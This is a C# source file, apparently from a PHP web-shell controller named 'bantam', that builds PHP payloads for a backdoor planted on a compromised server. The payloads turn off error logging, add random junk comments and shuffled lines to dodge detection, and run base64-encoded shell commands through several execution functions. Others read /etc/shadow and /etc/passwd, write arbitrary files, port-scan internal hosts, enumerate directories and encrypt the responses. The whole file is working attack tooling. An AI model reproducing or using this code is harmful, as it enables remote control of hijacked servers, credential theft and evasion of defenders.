﻿using bantam.Forms;
using System.Collections.Generic;
using System.Text;

namespace bantam.Classes
{
    static class PhpBuilder
    {
        /// <summary>
        /// 
        /// </summary>
        public const  string rowSeperator = "|=$=|";

        /// <summary>
        /// 
        /// </summary>
        public const string g_delimiter = ",.$.,";

        /// <summary>
        /// PHP
        /// </summary>
        public const string phpServerScriptFileName = "$_SERVER['SCRIPT_FILENAME']";

        /// <summary>
        /// Linux File Locations
        /// </summary>
        public const string linuxFS_ShadowFile          = "/etc/shadow";
        public const string linuxFS_PasswdFile          = "/etc/passwd";
        public const string linuxFS_IssueFile           = "/etc/issue.net";
        public const string linuxFS_hostTargetsFile     = "/etc/hosts";
        public const string linuxFS_ProcVersion         = "/proc/version";
        public const string linuxFS_NetworkInterfaces   = "/etc/network/interfaces";

        /// <summary>
        /// Windows File Locations
        /// </summary>
        public const string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        /// <summary>
        /// OS Commands
        /// </summary>
        public const string linuxOS_PsAux           = "ps aux";
        public const string linuxOS_Ifconfig        = "ifconfig";
        public const string windowsOS_Ipconfig      = "ipconfig";
        public const string windowsOS_TaskList      = "tasklist";
        public const string windowsOS_NetUser       = "net user";
        public const string windowsOS_NetAccounts   = "net accounts";
        public const string windowsOS_Ver           = "ver";
        public const string posixOS_Whoami          = "whoami";


        public static string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
        public static string phpOb_End = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPVar(int maxNum = 16)
        {
            int maxLength = Config.PhpVariableNameMaxLength;
            int randomLength = Helper.RandomNumber(maxLength);
            return "$" + Helper.RandomString(1, true) + Helper.RandomString(randomLength, true, true);
        }

        /// <summary>
        /// Returns a random PHP comment string of a random length with a maxlength, 
        /// uses a slider in the options form to determine injection freqency based on slider value
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPComment()
        {
            if (!Config.InjectRandomComments) {
                return string.Empty;
            }

            int randomNumber = Helper.RandomNumber(100);
            int maxCommentLength = Config.CommentMaxLength;
            int commentFreqency = Config.CommentFrequency;

            if (randomNumber <= commentFreqency) {
                int randomLength = Helper.RandomNumber(maxCommentLength);
                return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
            }
            return string.Empty;
        }

        /// <summary>
        /// Returns PHP code that should help to disable error logging, 
        /// shuffles the code into a random order since it does not matter
        /// </summary>
        /// <returns></returns>
        public static string DisableErrorLogging()
        {
            StringBuilder linesRandomized = new StringBuilder();

            //order doesn't matter so shuffle these lines
            List<string> shuffleableLines = new List<string> {
                "@error_reporting(0);",
                "@ini_set('error_log', NULL);",
                "@ini_set('log_errors', 0);"
            };

            Helper.ShuffleList(shuffleableLines);

            foreach (var line in shuffleableLines) {
                linesRandomized.Append(RandomPHPComment());
                linesRandomized.Append(line);
            }

            return linesRandomized.ToString();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static string MaxExecutionTime()
        {
            return "@ini_set('max_execution_time', 0);" + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <param name="mode"></param>
        /// <returns></returns>
        public static string OpenSSLEncryption(string varName, string encryptionKey, string encryptionIV, string mode = "AES-256-CBC")
        {
            return "echo base64_encode(@openssl_encrypt(" + varName + ", '" + mode + "', '" + encryptionKey + "', OPENSSL_RAW_DATA,'" + encryptionIV + "'));";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <returns></returns>
        public static string McryptEncryption(string varName, string encryptionKey, string encryptionIV)
        {
            string result = string.Empty;
            string padVar = RandomPHPVar();
            string blockBar = RandomPHPVar();

            result = blockBar + " = @mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                   + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                   + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                   + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
            return result;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="encryptionKey">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <param name="encryptionIV">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <returns></returns>
        public static string EncryptPhpVariableAndEcho(int ResponseEncryptionMode, ref string encryptionKey, ref string encryptionIV)
        {
            //todo make dynamic/random into config loaded once???
            string varName = "$result";
            encryptionIV = CryptoHelper.GetRandomEncryptionIV();
            encryptionKey = CryptoHelper.GetRandomEncryptionKey();

            string encryption = RandomPHPComment()
                              + varName + " = base64_encode(" + varName + ");"
                              + RandomPHPComment();

            if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
            } else if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
            } else {
                LogHelper.AddGlobalLog("Unkown encryption type selected.", "GUI Failure", LogHelper.LOG_LEVEL.ERROR);
                return string.Empty;
            }

            encryption += RandomPHPComment();

            return encryption;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string InitShellData(bool encryptResponse)
        {
            string osVar = RandomPHPVar();
            string cwdVar = RandomPHPVar();
            string freespaceVar = RandomPHPVar();
            string totalfreespaceVar = RandomPHPVar();
            string releaseVar = RandomPHPVar();
            string kernelVar = RandomPHPVar();
            string serverIpVar = RandomPHPVar();
            string serverSoftwareVar = RandomPHPVar();
            string userVar = RandomPHPVar();
            string uidVar = RandomPHPVar();
            string gidVar = RandomPHPVar();
            string groupVar = RandomPHPVar();
            string phpVersionVar = RandomPHPVar();

            string responseCode = string.Empty;

            StringBuilder linesRandomized = new StringBuilder();
            StringBuilder userLines = new StringBuilder();

            //order doesn't matter so shuffle these lines
            List<string> shuffleableLines = new List<string> {
                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",

                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");"
                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" 
                       + totalfreespaceVar+ " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),

                kernelVar       + " = @php_uname('s');",
                phpVersionVar   + " = @phpversion();",
                releaseVar      + " = @php_uname('r');",
                serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
            };

            Helper.ShuffleList(shuffleableLines);

            foreach (var line in shuffleableLines) {
                linesRandomized.Append(line);
                linesRandomized.Append(RandomPHPComment());
            }

            if (encryptResponse) {
                responseCode = "$result = ";
            } else {
                responseCode = "echo ";
            }

            responseCode += osVar + ".'" + g_delimiter
                     + "'." + cwdVar + ".'" + g_delimiter
                     + "'." + freespaceVar + ".'" + g_delimiter
                     + "'." + totalfreespaceVar + ".'" + g_delimiter
                     + "'." + releaseVar + ".'" + g_delimiter
                     + "'." + kernelVar + ".'" + g_delimiter
                     + "'." + serverIpVar + ".'" + g_delimiter
                     + "'." + serverSoftwareVar + ".'" + g_delimiter
                     + "'." + userVar + ".'" + g_delimiter
                     + "'." + uidVar + ".'" + g_delimiter
                     + "'." + gidVar + ".'" + g_delimiter
                     + "'." + groupVar + ".'" + g_delimiter
                     + "'." + phpVersionVar + ";";

            List<string> userInfoLines = new List<string> {
                "if (!function_exists('posix_getegid')) {",
                    userVar + " = @get_current_user();",
                    uidVar + " = @getmyuid();",
                    gidVar + " = @getmygid();",
                    groupVar + " = '?';",
                "} else {",
                    uidVar + " = @posix_getpwuid(posix_geteuid());",
                    gidVar + " = @posix_getgrgid(posix_getegid());",
                    userVar + "= " + uidVar + "['name'];",
                    uidVar + " = " + uidVar + "['uid'];",
                    gidVar + " = " + gidVar + "['gid'];",
                    groupVar + " = " + gidVar + "['name'];",
                "}"
            };

            foreach(var line in userInfoLines) {
                userLines.Append(line);
                userLines.Append(RandomPHPComment());
            }

            return linesRandomized
                 + userLines.ToString()
                 + responseCode
                 + RandomPHPComment();
        }

        /// <summary>
        /// Puts port 1-1024 into php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortsScannerPorts1To1024()
        {
            return "$ports = range(1, 1024);";
        }

        /// <summary>
        /// Puts every possible TCP port into the php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsAll()
        {
            return "$ports = range(1, 65535);";
        }

        /// <summary>
        /// Puts an array of common ports into the php variable $ports
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsCommon()
        {
            return "$ports = array(20, 21, 22, 23, 25, 53, 80, 81, 88, 110, 123, 135, 137, 138, 143, 443, 445, 587, 2049, 2082, 2083, 2086, 2087, 2525, 3306, 6379, 6380, 8443, 8843, 8080, 8081, 8888, 11211);";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="host"></param>
        /// <returns></returns>
        public static string PortScanner(string host, string portsCode, bool encryptResponse)
        {
            string connectionVar = RandomPHPVar();
            string portVar = RandomPHPVar();
            string errVar = RandomPHPVar();
            string errNoVar = RandomPHPVar();
            string hasResVar = RandomPHPVar();

            if (encryptResponse) {
                return RandomPHPComment()
                     + "$result='';"
                     + "@ini_set('max_execution_time', 0);"
                     + portsCode
                     + "foreach ($ports as " + portVar + ") {"
                        + connectionVar + " = @fsockopen('" + host + "', " + portVar  + ", " + errNoVar + ", "+ errVar + ", 2);"
                         + "if (is_resource(" + connectionVar  + ")) { "
                             + "$result .= " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). '" + rowSeperator + "';"
                             + "fclose(" + connectionVar + ");"
                        + "}}"
                     + "if (empty($result)) { $result = 'None'; }";
            } else {
                return RandomPHPComment()
                     + hasResVar + "=0;"
                     + "@ini_set('max_execution_time', 0);"
                     + portsCode
                     + "foreach ($ports as " + portVar + ") {"
                        + connectionVar + " = @fsockopen('" + host + "', " + portVar + ", " + errNoVar + ", " + errVar + ", 2);"
                        + "if (is_resource(" + connectionVar  + ")) { "
                            + hasResVar + " = 1;"
                             + "echo " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). \"\n\";"
                             + "fclose(" + connectionVar + ");"
                        + "}}"
                     + "if (empty(" + hasResVar + ")) { echo 'None'; }";
            }
        }

        /// <summary>
        /// Gets the php code for creating a very basic CURL request
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static string getBasicCurl(string url, bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();
            string responseCode = string.Empty;
            string curlVar = RandomPHPVar();

            if (encryptResponse) {
                responseCode = "$result = ";
            }

            List<string> lines = new List<string> {
                curlVar + " = curl_init();",

                "curl_setopt_array(" + curlVar + ", array(" +
                    "CURLOPT_SSL_VERIFYPEER => false," +
                    "CURLOPT_FOLLOWLOCATION => true," +
                    "CURLOPT_USERAGENT => '" + Config.DefaultUserAgent  + "'," +
                    "CURLOPT_RETURNTRANSFER => 1," +
                    "CURLOPT_URL => '" + url + "'," +
                "));",

                 responseCode + "curl_exec(" + curlVar + ");",

                 "curl_close(" + curlVar + ");"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }

            return result.ToString();
        }

        /// <summary>
        /// Executes system code using the function selected in the Options form
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ExecuteSystemCode(string code, bool encryptResponse)
        {
            string result = string.Empty;

            string randomvarName = RandomPHPVar();
            string b64Code = Helper.EncodeBase64ToString(code);

            if (encryptResponse) {
                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                    result = phpOb_Start + "@system(base64_decode('" + b64Code + "'));" + phpOb_End;
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                    result = phpOb_Start + "@passthru(base64_decode('" + b64Code + "'));" + phpOb_End;
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                    result = "$result = shell_exec(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                           + "$result = @join(PHP_EOL, " + randomvarName + ");";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                    result = "$result = ''; if(is_resource("+ randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                           + "while (!@feof(" + randomvarName + ")) { $result .= fread(" + randomvarName + ", 1024); }"
                           + "pclose(" + randomvarName + ");"
                           + "}";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                    result = randomvarName + " = base64_decode('" + b64Code + "'); $result = `" + randomvarName + "`;";
                }
            } else {
                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                    result = "@system(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                    result = "@passthru(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                    result = "echo shell_exec(base64_decode('" + b64Code + "'));";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                    result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                           + "echo @join(PHP_EOL, " + randomvarName + ");";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                    result = "if(is_resource(" + randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                           + "while (!@feof(" + randomvarName + ")) { echo fread(" + randomvarName + ", 1024); }"
                           + "pclose(" + randomvarName + ");"
                           + "}";
                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                    result = "echo `base64_decode('" + b64Code + "')`";
                }
            }
            return RandomPHPComment() + result + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string PhpInfo(bool encryptResponse)
        {
            if (encryptResponse) {
                return phpOb_Start
                      + "phpinfo();"
                      + phpOb_End;
            } else {
                return RandomPHPComment()
                       + "phpinfo();"
                       + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptReponse"></param>
        /// <returns></returns>
        public static string PhpTestExecutionWithEcho1(bool encryptReponse)
        {
            if (encryptReponse) {
                return RandomPHPComment()
                     + "$result = '1';"
                     + RandomPHPComment();

            } else {
                return RandomPHPComment()
                     + "echo '1';"
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string GetHardDriveLettersPhp(bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();

            string driveVar = RandomPHPVar();
            string responseCode = string.Empty;

            if (encryptResponse) {
                responseCode = "$result .= ";
            } else {
                responseCode = "echo ";
            }

            List<string> lines = new List<string> {
                "$result=''; foreach (range('a', 'z') as " + driveVar + ") {",
                "if (is_dir(" + driveVar + @". ':\\')) {",
                responseCode + driveVar + ".':|';",
                "}}"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }
            return result.ToString();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                     + "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
                     + RandomPHPComment();
            } else {
                return RandomPHPComment()
                     + "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileToBase64(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                     + "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
                     + RandomPHPComment();
            } else {
                return RandomPHPComment()
                     + "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="remoteFileLocation"></param>
        /// <param name="b64FileContents"></param>
        /// <returns></returns>
        public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
        {
            return RandomPHPComment()
                 + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
                 + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="remoteFileLocation"></param>
        /// <param name="b64FileContents"></param>
        /// <returns></returns>
        public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
        {
            return RandomPHPComment()
                 + "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");"
                 + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string DirectoryEnumerationCode(string location, string phpVersion, bool encryptResponse)
        {
            StringBuilder result = new StringBuilder();

            string varItem = RandomPHPVar();
            string responseCode = string.Empty;
            string varException = RandomPHPVar();

            if (encryptResponse) {
                responseCode = "$result .= ";
            } else {
                responseCode = "echo ";
            }

            List<string> lines = new List<string> {
                "$result='';",
                 "try {",
                 "foreach (new DirectoryIterator('" + location + "') as " + varItem + ") {",

                 responseCode + varItem + "->getBasename().'" + g_delimiter + "'."
                        + varItem + "->getPath().'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                        + varItem + "->getPerms().'" + rowSeperator + "';",

                 "}}catch(Exception " + varException + "){ }"
            };

            foreach(var line in lines) {
                result.Append(RandomPHPComment());
                result.Append(line);
            }
            return result.ToString();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowsOS"></param>
        /// <returns></returns>
        public static string TaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }
    }
}